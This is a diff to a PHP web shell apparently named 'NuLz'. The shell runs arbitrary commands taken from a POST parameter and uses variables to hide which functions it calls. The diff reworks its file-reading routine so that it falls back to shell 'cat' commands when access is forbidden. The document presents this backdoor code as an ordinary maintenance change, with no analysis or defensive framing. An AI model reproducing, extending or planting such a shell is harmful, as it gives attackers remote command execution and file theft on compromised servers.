@@ -205,24 +205,28 @@ if (isset($_POST['nulz'])) {
     $komendnya = $_POST['nulz'];
     echo NuLzCmd($komendnya);
 }
-function NuLzReadFile($this_file) {
+function NuLzReadFile($this_file)
+{
+    global $hayoloh;
     global $func_exist;
     global $f_get;
     global $fo;
     global $fr;
     global $fc;
-    $cantread = 'Cant Not Read '.$this_file;
+    $cantread = 'Cant Not Read ' . $this_file;
     $content = '';
+    
     if ($func_exist($fo)) {
         $fi_le = $fo($this_file, 'r');
         if ($fi_le) {
+            $headers = get_headers($this_file);
+            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
+                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
+            }
             while (!feof($fi_le)) {
                 $content .= $fr($fi_le, 8192);
             }
             $fc($fi_le);
-            if (empty($content)||!$content) {
-                $content = NuLzCmd('cat "'.addslashes($this_file).'"');
-            }
             return $content;
         } else {
             echo $cantread;
@@ -231,8 +235,9 @@ function NuLzReadFile($this_file) {
     } elseif ($func_exist($f_get)) {
         $content = $f_get($this_file);
         if ($content) {
-            if (empty($content)||!$content) {
-                $content = NuLzCmd('cat "'.addslashes($this_file).'"');
+            $headers = get_headers($this_file);
+            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
+                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
             }
             return $content;
         } else {
